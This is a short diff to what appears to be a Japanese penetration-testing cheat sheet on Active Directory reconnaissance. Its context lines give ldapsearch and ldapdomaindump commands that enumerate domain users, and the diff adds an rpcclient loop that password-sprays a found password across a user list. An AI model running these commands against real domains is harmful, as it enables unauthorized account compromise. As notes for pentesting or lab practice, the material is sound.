@@ -6,6 +6,8 @@ ldapsearch -H ldap://<IP> -x -b "DC=example,DC=com" > ldap.txt
 
 ldapsearch -h <IP> -x -b "DC=EXAMPLE,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 #ldapsearchでユーザ名を抽出するワンライナー
+for u in $(cat user.txt);do rpcclient -U "$u%<pass>" -c "getusername;quit" <IP> | grep Authority; done
+#見つけたパスワードでユーザリストに対してスプレーするワンライナー
 
 //ユーザ情報を利用していろいろな情報を取れる
 ldapdomaindump -u <domain>\\<user> -p <pass> <IP> -o <outoput file>
